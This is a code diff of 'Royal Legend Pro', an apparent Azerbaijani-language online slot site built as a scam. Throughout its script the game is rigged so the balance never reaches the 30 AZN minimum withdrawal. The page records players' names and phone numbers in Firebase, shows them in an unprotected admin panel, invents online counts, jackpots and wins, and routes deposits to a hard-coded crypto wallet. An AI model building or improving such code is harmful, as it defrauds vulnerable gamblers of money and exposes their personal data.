@@ -6,84 +6,79 @@
     <title>Royal Legend Pro</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        body { background: #0b0e14; color: #fff; font-family: sans-serif; overflow-x: hidden; }
-        .neon-glow { text-shadow: 0 0 15px #00d2ff, 0 0 30px #9d50bb; }
-        .glass-box { background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(12px); border: 1px solid rgba(255,255,255,0.1); border-radius: 25px; }
+        body { background: #0b1118; color: #fff; font-family: 'Segoe UI', sans-serif; overflow: hidden; height: 100vh; }
+        .neon-text { text-shadow: 0 0 10px #00d2ff, 0 0 20px #9d50bb; }
+        .glass { background: rgba(255, 255, 255, 0.07); backdrop-filter: blur(15px); border: 1px solid rgba(255,255,255,0.1); border-radius: 20px; }
         
-        /* Meyvə hərəkəti (Slot) */
-        .slot-reel { height: 100px; overflow: hidden; border: 2px solid #9d50bb; border-radius: 10px; background: #000; position: relative; }
-        .reel-container { position: absolute; width: 100%; transition: top 2s cubic-bezier(0.45, 0.05, 0.55, 0.95); }
+        /* Meyvə Çarxları - Realist Animasiya */
+        .slot-window { height: 120px; overflow: hidden; background: #000; border: 2px solid #9d50bb; border-radius: 12px; position: relative; }
+        .reel { position: absolute; width: 100%; top: 0; transition: top 2.5s cubic-bezier(0.1, 0, 0.1, 1); display: flex; flex-direction: column; align-items: center; }
+        .symbol { height: 120px; display: flex; align-items: center; justify-content: center; font-size: 3rem; }
 
-        /* Pul Yağışı */
-        .money-rain { position: fixed; top: -50px; font-size: 24px; animation: fall 3s linear infinite; z-index: 100; pointer-events: none; }
-        @keyframes fall { to { transform: translateY(110vh) rotate(360deg); } }
+        /* Arxa fonda Manat yağışı */
+        .manat { position: fixed; top: -50px; color: #2ecc71; font-weight: bold; font-size: 20px; z-index: -1; animation: fall linear infinite; opacity: 0.6; }
+        @keyframes fall { to { transform: translateY(105vh) rotate(360deg); } }
 
-        /* Admin Emoji Düyməsi */
-        #admin-trigger { cursor: pointer; opacity: 0.8; transition: 0.3s; }
-        #admin-trigger:hover { opacity: 1; transform: scale(1.2); }
+        /* Bildirişlər */
+        #notif-area { position: fixed; left: 10px; bottom: 80px; z-index: 100; }
+        .win-notif { background: rgba(0,0,0,0.8); color: #f1c40f; padding: 8px 15px; border-radius: 20px; margin-top: 5px; font-size: 12px; border-left: 3px solid #f1c40f; animation: slideIn 0.5s ease-out; }
+        @keyframes slideIn { from { transform: translateX(-100%); } to { transform: translateX(0); } }
+
+        /* Böyük Uduş Atəşfəşanlığı */
+        .gold-coin { position: fixed; bottom: -50px; font-size: 30px; z-index: 200; animation: erupt 2s ease-out forwards; }
+        @keyframes erupt { to { transform: translateY(-100vh) translateX(var(--x)); opacity: 0; } }
     </style>
 </head>
 <body>
 
-    <div id="login-screen" class="fixed inset-0 bg-black z-[200] flex items-center justify-center p-6">
-        <div class="glass-box p-8 w-full max-w-sm text-center">
-            <h2 class="text-2xl font-bold mb-6 neon-glow">Xoş Gəldiniz!</h2>
-            <input type="text" id="user-name" placeholder="Adınız" class="w-full p-3 mb-4 bg-gray-800 rounded outline-none border border-purple-500">
-            <input type="tel" id="user-phone" placeholder="Nömrəniz" class="w-full p-3 mb-6 bg-gray-800 rounded outline-none border border-purple-500">
-            <button onclick="login()" class="w-full bg-blue-600 p-3 rounded-xl font-bold">OYUNA GİR</button>
+    <div id="login-screen" class="fixed inset-0 bg-black z-[500] flex items-center justify-center p-6">
+        <div class="glass p-8 w-full max-w-sm text-center">
+            <h2 class="text-3xl font-bold mb-6 neon-text">Xoş Gəldiniz!</h2>
+            <input type="text" id="u_name" placeholder="Adınız" class="w-full p-4 mb-4 bg-gray-900 border border-purple-500 rounded-xl outline-none">
+            <input type="tel" id="u_phone" placeholder="Nömrəniz" class="w-full p-4 mb-6 bg-gray-900 border border-purple-500 rounded-xl outline-none">
+            <button onclick="enterGame()" class="w-full bg-blue-600 p-4 rounded-xl font-bold text-xl">OYUNA GİR</button>
         </div>
     </div>
 
-    <div class="p-4 flex justify-between items-start sticky top-0 z-50">
+    <div class="p-4 flex justify-between items-start relative z-50">
         <div>
-            <h1 class="text-2xl font-bold neon-glow">ROYAL LEGEND PRO</h1>
-            <p class="text-xs text-green-400">🟢 Hazırda <span id="online-val">4,839</span> nəfər onlayndır</p>
+            <h1 class="text-xl font-bold neon-text">ROYAL LEGEND PRO</h1>
+            <p class="text-xs text-green-400">🟢 Hazırda <span id="online-counter">5,000</span> nəfər onlayndır</p>
         </div>
         <div class="text-right">
-            <p class="text-yellow-400 font-bold text-2xl italic">JACKPOT</p>
-            <p class="text-white text-xl font-bold" id="jackpot-val">540,231.45 AZN</p>
-            <span id="admin-trigger" onclick="openAdmin()" class="text-2xl">🛑</span>
+            <p class="text-yellow-500 font-black text-sm uppercase">Jackpot</p>
+            <p id="jackpot" class="text-2xl font-bold text-white italic">50000.00 AZN</p>
+            <span onclick="openAdmin()" class="cursor-pointer text-xl mt-2 block">🛑</span>
         </div>
     </div>
 
-    <div class="container mx-auto p-4 text-center">
-        <div class="glass-box p-6 max-w-md mx-auto relative overflow-hidden">
-            <h2 class="text-xl mb-4">Balansınız: <span id="balance-display" class="text-green-400 font-bold">0.00</span> AZN</h2>
+    <div class="container mx-auto px-4 mt-4">
+        <div class="glass p-6 text-center shadow-2xl">
+            <p class="text-lg mb-4 text-gray-300">Balansınız: <span id="balance" class="text-green-400 font-bold text-2xl">0.00</span> AZN</p>
             
             <div class="grid grid-cols-4 gap-2 mb-6">
-                <div class="slot-reel"><div id="reel1" class="reel-container top-0 text-3xl py-4">🎰<br>🍒<br>💎<br>7<br>💰</div></div>
-                <div class="slot-reel"><div id="reel2" class="reel-container top-0 text-3xl py-4">💰<br>7<br>🎰<br>💎<br>🍒</div></div>
-                <div class="slot-reel"><div id="reel3" class="reel-container top-0 text-3xl py-4">💎<br>💰<br>🍒<br>7<br>🎰</div></div>
-                <div class="slot-reel"><div id="reel4" class="reel-container top-0 text-3xl py-4">7<br>💎<br>💰<br>🎰<br>🍒</div></div>
+                <div class="slot-window"><div id="r1" class="reel"></div></div>
+                <div class="slot-window"><div id="r2" class="reel"></div></div>
+                <div class="slot-window"><div id="r3" class="reel"></div></div>
+                <div class="slot-window"><div id="r4" class="reel"></div></div>
             </div>
 
-            <input type="number" id="bet-input" value="1" class="w-full p-3 rounded bg-gray-900 border border-purple-500 mb-4 text-center">
-            <button onclick="spin()" id="spin-btn" class="w-full bg-gradient-to-r from-blue-500 to-purple-600 p-4 rounded-2xl font-bold text-xl shadow-lg">FIRLAT! 🎰</button>
+            <input type="number" id="bet" value="1" class="w-full p-4 bg-gray-900 border-2 border-purple-600 rounded-2xl mb-4 text-center text-xl font-bold outline-none">
+            <button id="spin-btn" onclick="handleSpin()" class="w-full bg-gradient-to-r from-blue-600 to-purple-700 p-5 rounded-2xl font-black text-2xl shadow-lg active:scale-95 transition">FIRLAT! 🎰</button>
         </div>
 
-        <div class="mt-8 flex flex-col gap-4 max-w-md mx-auto">
-            <button onclick="withdrawRequest()" class="bg-red-600 p-3 rounded-full font-bold shadow-lg">PUL ÇIXAR</button>
-            <button onclick="window.location.href='https://www.tiktok.com/@elcan.alzade3'" class="border border-white p-3 rounded-full font-bold">TIKTOK DESTEK</button>
-            <button onclick="showBinance()" class="bg-orange-500 p-3 rounded-full font-bold text-black shadow-lg uppercase">Binance Depozit</button>
+        <div class="flex flex-col gap-3 mt-6">
+            <button onclick="withdraw()" class="bg-red-600 p-4 rounded-full font-bold uppercase shadow-lg">Pul Çıxar</button>
+            <button onclick="window.location.href='https://www.tiktok.com/@elcan.alzade3'" class="border-2 border-white p-4 rounded-full font-bold uppercase">Tiktok Destek</button>
+            <button onclick="showBinance()" class="bg-orange-500 p-4 rounded-full font-bold text-black uppercase shadow-lg">Binance Depozit</button>
         </div>
     </div>
 
-    <div id="admin-modal" class="fixed inset-0 bg-gray-900 z-[300] hidden p-6 overflow-y-auto">
-        <div class="flex justify-between items-center mb-6">
-            <h2 class="text-2xl font-bold text-red-500">ADMIN NƏZARƏT</h2>
-            <button onclick="closeAdmin()" class="bg-white text-black px-4 py-1 rounded">X</button>
-        </div>
-        <div id="users-list" class="space-y-4">
-            </div>
-    </div>
+    <div id="notif-area"></div>
 
-    <div id="binance-modal" class="fixed inset-0 bg-black bg-opacity-90 z-[250] hidden flex items-center justify-center p-6">
-        <div class="glass-box p-8 w-full max-w-xs text-center">
-            <h3 class="font-bold mb-4">Binance ID Kopyala</h3>
-            <p id="binance-id" class="bg-gray-800 p-3 rounded mb-4 break-all text-orange-400">TJQbpsPqD9up2iwHUCLZHDxs1g67uq3mrQ</p>
-            <button onclick="copyBinance()" class="bg-orange-500 text-black px-6 py-2 rounded font-bold">KOPYALA</button>
-            <button onclick="this.parentElement.parentElement.classList.add('hidden')" class="block mt-4 text-sm text-gray-400 mx-auto">Bağla</button>
-        </div>
+    <div id="admin-panel" class="fixed inset-0 bg-gray-900 z-[600] hidden p-6 overflow-y-auto">
+        <div class="flex justify-between items-center mb-8"><h2 class="text-2xl font-bold text-red-500">ADMIN NƏZARƏT</h2><button onclick="closeAdmin()" class="text-3xl">×</button></div>
+        <div id="user-list" class="space-y-4"></div>
     </div>
 
     <script type="module">
@@ -102,132 +97,166 @@
 
         const app = initializeApp(firebaseConfig);
         const db = getDatabase(app);
+        const symbols = ['🍒', '🍋', '💎', '7', '💰', '🎰', '🔔'];
+        let user = null;
+        let isBoosted = false; // Plan 2 üçün
 
-        let currentUser = null;
-        let playCount = 0;
-        let isAdminBoosted = false; // Sən pul vuranda işə düşən Plan 2
+        // Reels Hazırlanması
+        document.querySelectorAll('.reel').forEach(r => {
+            for(let i=0; i<30; i++) r.innerHTML += `<div class="symbol">${symbols[Math.floor(Math.random()*symbols.length)]}</div>`;
+        });
 
-        // GİRİŞ MƏNTİQİ
-        window.login = () => {
-            const name = document.getElementById('user-name').value;
-            const phone = document.getElementById('user-phone').value;
-            if(!name || !phone) return alert("Məlumatları tam doldurun!");
+        window.enterGame = () => {
+            const name = document.getElementById('u_name').value;
+            const phone = document.getElementById('u_phone').value;
+            if(!name || !phone) return;
 
-            currentUser = { name, phone, balance: 5.00, id: "u_" + Date.now() };
-            document.getElementById('login-screen').classList.add('hidden');
-            
-            // Firebase-ə qeyd et
-            set(ref(db, 'users/' + currentUser.id), currentUser);
-            syncData();
-            startRain();
+            user = { id: 'u_' + Date.now(), name, phone, balance: 5.00 };
+            document.getElementById('login-screen').style.display = 'none';
+            set(ref(db, 'users/' + user.id), user);
+            initSync();
+            startManatRain();
+            startJackpot();
+            startOnlineCounter();
+            startFakeWins();
         };
 
-        function syncData() {
-            onValue(ref(db, 'users/' + currentUser.id), (snapshot) => {
-                const data = snapshot.val();
-                if(data) {
-                    // Əgər admin balans artırıbsa Plan 2-ni aktiv et
-                    if(data.balance > currentUser.balance) isAdminBoosted = true;
-                    currentUser.balance = data.balance;
-                    document.getElementById('balance-display').innerText = currentUser.balance.toFixed(2);
-                }
+        function initSync() {
+            onValue(ref(db, 'users/' + user.id), (snap) => {
+                const data = snap.val();
+                if(data.balance > user.balance) isBoosted = true; // Əgər balans artıbsa Plan 2 aktiv olur
+                user.balance = data.balance;
+                document.getElementById('balance').innerText = user.balance.toFixed(2);
             });
         }
 
-        // OYUN ALQORİTMİ (ŞİRNİKLƏNDİRMƏ VƏ SIFIRLAMA)
-        window.spin = () => {
-            let bet = parseFloat(document.getElementById('bet-input').value);
-            if(bet > currentUser.balance || bet < 1) return alert("Balans yetərsiz!");
+        window.handleSpin = () => {
+            let betAmt = parseFloat(document.getElementById('bet').value);
+            if(betAmt < 1 || betAmt > user.balance) return alert("Balans yetərsiz!");
 
-            document.getElementById('spin-btn').disabled = true;
-            playCount++;
-            
-            // Çarx hərəkəti
-            [1,2,3,4].forEach(i => {
-                let r = document.getElementById('reel'+i);
-                r.style.top = "-200px";
-                setTimeout(() => r.style.top = "0px", 2000);
+            const btn = document.getElementById('spin-btn');
+            btn.disabled = true;
+
+            // Çarxları fırlat
+            document.querySelectorAll('.reel').forEach((r, i) => {
+                r.style.transition = 'none';
+                r.style.top = '0px';
+                setTimeout(() => {
+                    r.style.transition = `top ${2 + (i*0.2)}s cubic-bezier(0.1, 0, 0.1, 1)`;
+                    r.style.top = '-2400px';
+                }, 50);
             });
 
             setTimeout(() => {
                 let win = 0;
-                
-                // MƏNTİQ 1: İlk girişdə 1-2 AZN udur (Max 20 AZN-ə qədər qalxır)
-                if(!isAdminBoosted && playCount <= 5 && currentUser.balance < 20) {
-                    win = bet * 1.5;
+                // ALQORİTM: Plan 1 (Yeni oyunçu)
+                if(!isBoosted && user.balance < 20) {
+                    win = Math.random() < 0.7 ? betAmt * 1.5 : 0;
                 } 
-                // MƏNTİQ 2: Sən pul vurmusansa (Plan 2) - Max 29 AZN-ə qalxır, sonra 0-a doğru
-                else if(isAdminBoosted) {
-                    if(currentUser.balance < 29) {
-                        win = bet * 1.2;
+                // ALQORİTM: Plan 2 (Admin pul vurandan sonra)
+                else if(isBoosted) {
+                    if(user.balance < 29) {
+                        win = Math.random() < 0.6 ? betAmt * 1.3 : 0;
                     } else {
-                        win = 0; // 30-a çata bilməz!
+                        win = 0; // 30-a əsla çatmasın
                     }
-                }
-                // MƏNTİQ 3: Balans çoxdursa, yavaş-yavaş sıfırlama
-                else {
-                    win = 0;
+                } else {
+                    win = 0; // Balans 0-a doğru
                 }
 
-                currentUser.balance = (currentUser.balance - bet) + win;
-                update(ref(db, 'users/' + currentUser.id), { balance: currentUser.balance });
-                document.getElementById('spin-btn').disabled = false;
-            }, 2100);
+                user.balance = (user.balance - betAmt) + win;
+                update(ref(db, 'users/' + user.id), { balance: user.balance });
+                if(win > 0) triggerGoldRain();
+                btn.disabled = false;
+            }, 3000);
         };
 
-        // ADMIN PANEL FUNKSİYALARI
+        // Effektlər
+        function startManatRain() {
+            setInterval(() => {
+                let m = document.createElement('div');
+                m.className = 'manat';
+                m.innerText = '₼';
+                m.style.left = Math.random() * 100 + 'vw';
+                m.style.animationDuration = (Math.random() * 2 + 2) + 's';
+                document.body.appendChild(m);
+                setTimeout(() => m.remove(), 4000);
+            }, 300);
+        }
+
+        function triggerGoldRain() {
+            for(let i=0; i<40; i++) {
+                let c = document.createElement('div');
+                c.className = 'gold-coin';
+                c.innerText = '💰';
+                c.style.left = '50%';
+                c.style.setProperty('--x', (Math.random()*400 - 200) + 'px');
+                document.body.appendChild(c);
+                setTimeout(() => c.remove(), 2000);
+            }
+        }
+
+        function startJackpot() {
+            let val = 50000.00;
+            setInterval(() => {
+                val += Math.random() * 0.05;
+                document.getElementById('jackpot').innerText = val.toFixed(2) + " AZN";
+            }, 1000);
+        }
+
+        function startOnlineCounter() {
+            let count = 4839;
+            setInterval(() => {
+                count += Math.floor(Math.random() * 11) - 5;
+                document.getElementById('online-counter').innerText = count.toLocaleString();
+            }, 3000);
+        }
+
+        function startFakeWins() {
+            const fakeNames = ["Elvin", "Samir", "Aysel", "Rauf", "050***44", "070***21"];
+            setInterval(() => {
+                let n = document.createElement('div');
+                n.className = 'win-notif';
+                n.innerText = `${fakeNames[Math.floor(Math.random()*fakeNames.length)]} indicə ${Math.floor(Math.random()*300)+50} AZN qazandı!`;
+                document.getElementById('notif-area').appendChild(n);
+                setTimeout(() => n.remove(), 5000);
+            }, 8000);
+        }
+
+        // Admin & Digər
         window.openAdmin = () => {
-            document.getElementById('admin-modal').classList.remove('hidden');
-            onValue(ref(db, 'users'), (snapshot) => {
-                const users = snapshot.val();
+            document.getElementById('admin-panel').style.display = 'block';
+            onValue(ref(db, 'users'), (snap) => {
                 let html = '';
+                const users = snap.val();
                 for(let id in users) {
-                    html += `
-                        <div class="p-4 bg-gray-800 rounded flex justify-between items-center">
-                            <div>
-                                <p class="font-bold">${users[id].name} (${users[id].phone})</p>
-                                <p class="text-green-400">Balans: ${users[id].balance} AZN</p>
-                            </div>
-                            <div class="flex gap-2">
-                                <button onclick="changeBalance('${id}', 10)" class="bg-blue-500 p-1 text-xs">+10</button>
-                                <button onclick="changeBalance('${id}', -10)" class="bg-red-500 p-1 text-xs">-10</button>
-                            </div>
-                        </div>`;
+                    html += `<div class="p-4 glass mb-2 flex justify-between items-center">
+                        <div><b>${users[id].name}</b><br><small>${users[id].phone}</small><br><span class="text-green-400">${users[id].balance.toFixed(2)} AZN</span></div>
+                        <div class="flex gap-2">
+                            <button onclick="changeBal('${id}', 10)" class="bg-blue-600 px-3 py-1 rounded">+10</button>
+                            <button onclick="changeBal('${id}', -10)" class="bg-red-600 px-3 py-1 rounded">-10</button>
+                        </div>
+                    </div>`;
                 }
-                document.getElementById('users-list').innerHTML = html;
+                document.getElementById('user-list').innerHTML = html;
             });
         };
 
-        window.changeBalance = (id, amt) => {
-            update(ref(db, 'users/' + id), { balance: Math.max(0, currentUser.balance + amt) });
+        window.changeBal = (id, amt) => {
+            update(ref(db, `users/${id}`), { balance: Math.max(0, user.balance + amt) });
         };
 
-        window.closeAdmin = () => document.getElementById('admin-modal').classList.add('hidden');
+        window.closeAdmin = () => document.getElementById('admin-panel').style.display = 'none';
 
-        // BİNANCE KOPYALAMA
-        window.showBinance = () => document.getElementById('binance-modal').classList.remove('hidden');
-        window.copyBinance = () => {
+        window.showBinance = () => {
             navigator.clipboard.writeText("TJQbpsPqD9up2iwHUCLZHDxs1g67uq3mrQ");
-            alert("ID Kopyalandı!");
+            alert("Binance ID Kopyalandı: TJQbpsPqD9up2iwHUCLZHDxs1g67uq3mrQ");
         };
 
-        // PUL YAĞIŞI
-        function startRain() {
-            setInterval(() => {
-                const div = document.createElement('div');
-                div.className = 'money-rain';
-                div.innerText = '💰';
-                div.style.left = Math.random() * 100 + 'vw';
-                document.body.appendChild(div);
-                setTimeout(() => div.remove(), 3000);
-            }, 500);
-        }
-
-        // Jackpot Sayğacı
-        setInterval(() => {
-            let val = parseFloat(document.getElementById('jackpot-val').innerText);
-            document.getElementById('jackpot-val').innerText = (val + 0.05).toFixed(2) + " AZN";
-        }, 1000);
+        window.withdraw = () => {
+            if(user.balance < 30) alert("Minimum çıxarış 30 AZN-dir!");
+            else alert("Tələbiniz göndərildi. 24 saat ərzində yüklənəcək.");
+        };
     </script>
 </body>
 </html>
